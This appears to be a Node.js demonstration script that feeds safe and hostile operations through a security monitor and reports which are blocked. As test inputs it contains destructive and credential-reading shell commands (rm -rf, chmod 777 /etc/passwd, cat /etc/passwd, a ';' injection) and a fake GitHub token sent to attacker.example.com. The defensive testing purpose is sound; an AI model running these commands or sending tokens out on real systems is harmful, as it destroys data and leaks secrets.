#!/usr/bin/env node
// Runs a representative set of safe and malicious operations through the
// real SecurityMonitor so you can see how it behaves end-to-end, and watch
// it show up live in the dashboard (it writes to the real security.log).

const { getInstance } = require('../index');
const { exec } = require('child_process');
const fs = require('fs');
const net = require('net');

const monitor = getInstance({ logFile: './security.log', alert: false });

let passed = 0;
let failed = 0;

function report(name, expectBlocked, actuallyBlocked, detail) {
  const ok = expectBlocked === actuallyBlocked;
  ok ? passed++ : failed++;
  const verdict = actuallyBlocked ? 'BLOCKED' : 'ALLOWED';
  const mark = ok ? '✅' : '❌';
  console.log(`${mark} [${verdict}] ${name}${detail ? ` — ${detail}` : ''}`);
}

function runExec(name, command, expectBlocked) {
  try {
    exec(command);
    report(name, expectBlocked, false);
  } catch (err) {
    report(name, expectBlocked, true, err.message);
  }
}

function runFsUnlink(name, targetPath, expectBlocked) {
  fs.unlink(targetPath, err => {
    const blocked = err?.code === 'SECURITY_BLOCK';
    report(name, expectBlocked, blocked, err?.message);
  });
}

function runConnect(name, host, port, expectBlocked) {
  const socket = new net.Socket();
  socket.on('error', () => {}); // an allowed connect still attempts a real lookup in the background; ignore its outcome here
  try {
    socket.connect(port, host);
    report(name, expectBlocked, false);
  } catch (err) {
    report(name, expectBlocked, true, err.message);
  } finally {
    socket.destroy();
  }
}

function runPayload(name, host, payload, expectBlocked) {
  const socket = new net.Socket();
  socket.on('error', () => {}); // never actually connected, so ignore teardown noise
  socket._gilSecHost = host;
  socket._gilSecPort = 443;
  try {
    socket.write(payload);
    report(name, expectBlocked, false);
  } catch (err) {
    report(name, expectBlocked, true, err.message);
  } finally {
    socket.destroy();
  }
}

console.log('\n=== Commands ===');
runExec('safe command (git status)', 'git status', false);
runExec('recursive delete (rm -rf)', 'rm -rf /tmp/simulated-target', true);
runExec('permission bomb (chmod 777 on a system file)', 'chmod 777 /etc/passwd', true);
runExec('curl piped into a known Ethereum RPC endpoint', 'curl https://eth-mainnet.publicnode.com/', true);
runExec('reading /etc/passwd', 'cat /etc/passwd', true);
runExec('command injection via ;', 'ls; rm -rf /tmp/simulated-target', true);

console.log('\n=== Filesystem ===');
runFsUnlink('deleting a protected system file', '/etc/passwd', true);

console.log('\n=== Network ===');
runConnect('connecting to a suspicious port', 'example.com', 3389, true);
runConnect('connecting to a known Ethereum RPC endpoint', 'mainnet.infura.io', 443, true);
runConnect('connecting to an ordinary host on a normal port (not actually opened)', 'nonexistent.invalid', 443, false);
runPayload('GitHub token sent to an unrelated host', 'attacker.example.com', 'token=ghp_1234567890abcdef1234567890abcdef1234', true);
runPayload('GitHub token sent to github.com itself', 'api.github.com', 'token=ghp_1234567890abcdef1234567890abcdef1234', false);

setTimeout(() => {
  console.log(`\n${passed} behaved as expected, ${failed} did not.`);
  monitor.shutdown();
  process.exitCode = failed > 0 ? 1 : 0;
}, 500);
